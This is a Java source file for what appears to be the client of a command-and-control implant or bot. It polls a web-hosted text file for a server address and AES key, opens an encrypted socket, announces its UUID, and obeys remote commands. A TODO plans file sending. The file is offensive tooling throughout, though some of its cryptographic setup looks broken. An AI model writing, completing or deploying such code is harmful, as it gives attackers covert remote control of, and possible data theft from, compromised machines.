package com.revsn.client;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import java.util.Base64;
import java.util.UUID;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class Client {
    private UUID uniqueID;
    private Socket reqSock;
    private CipherInputStream ciIn;
    private CipherOutputStream ciOut;

    private Cipher cipher;

    private int counter = 5;

    private String[] address = new String[2];

    private SecretKey key;

    private IvParameterSpec iv;

    private boolean initDone = false;
    private boolean trigCheck = false;
    private boolean connExists = false;

    public Client(UUID uniUuid) {
        this.uniqueID = uniUuid;
    }

    private boolean init() {
        try {
            if(!connExists) {
                System.out.println("INIT");
                this.reqSock = new Socket(address[0], Integer.parseInt(address[1]));

                ciOut = new CipherOutputStream(new ObjectOutputStream(reqSock.getOutputStream()), cipher);
                ciOut.flush();

                ciIn = new CipherInputStream(new ObjectInputStream(reqSock.getInputStream()), cipher);

                sendMessage(uniqueID + ": just arrived to vacation!");

                initDone = true;

                connExists = true;

                return true;
            } else {
                ciOut.flush();
                return true;
            }

        } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
            System.out.println("catch in init");
            initDone = false;
            return false;
        }
    }

    private void close() {
        try {
            connExists = false;
            ciIn.close();
            ciOut.close();
            reqSock.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private boolean checkTrig() throws IOException {
        //Go for webserver and extract IP, Port and Key. Then set and use the stuff
        try {
            String URL = "http://127.0.0.1:8080/shesh.txt";
            URL url = new URL(URL);

            Document doc = Jsoup.parse(url, 1000 * 3);
            String text = doc.body().text();

            System.out.println(text);

            String outp[] = text.split(";");

            address[0] = outp[0];
            address[1] = outp[1];
            System.out.println(address[0]);

            byte[] decodedKey = Base64.getDecoder().decode(outp[2]);
            byte[] decodedIv = Base64.getDecoder().decode(outp[3]);

            this.key = new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES/CBC/PKCS5Padding");
            this.iv = new IvParameterSpec(decodedIv, 0, decodedIv.length);

            System.out.println("CheckTrigTrue");
            trigCheck = true;
            return true;
        } catch (IOException e) {
            System.out.println("catch in checktrig");
            trigCheck = false;
            return false;
        }
        
    }

    private boolean updateStuff() {
        try {
            checkTrig();
        } catch (IOException e) {
            return false;
        }
        return true;
    }

    private void sendMessage(String msg) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchPaddingException {
        try {
            System.out.println("Send message :" + msg);
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        
            cipher.init(Cipher.ENCRYPT_MODE, this.key, this.iv);

            ciOut.write(msg.getBytes(StandardCharsets.UTF_8));
            System.out.println(msg.getBytes(StandardCharsets.UTF_8));

            ciOut.flush();
            
        } catch (IOException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    public void handleMessage(byte[] msg) {

        try {
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, this.key, this.iv);
            
            String message = new String(cipher.doFinal(Base64.getDecoder()
                .decode(msg)));

            if (message.charAt(0) == '1') {
                sendMessage(uniqueID + ": said goobye, sadly.");
                close();
            }

            if (message.charAt(0) == '9' && message.charAt(1) == '9' && message.charAt(2) == '9') {
                updateStuff();
            }

            //TODO: Implement message handling, like send files etc


        } catch (IllegalBlockSizeException | BadPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            e.printStackTrace();
        }
            
    }

    public void run() {
        try {
            while (!checkTrig() && !trigCheck) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println("Passed checktrig");
        if (!init() && !initDone) {
            try {
                Thread.sleep(10000);
                return;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        } 

        while (!reqSock.isClosed()) {
            try {
                handleMessage(ciIn.readAllBytes());
            }
            catch (IOException | NullPointerException ioEx) {
                close();
                try {
                    Thread.sleep(10000);
                } catch(InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
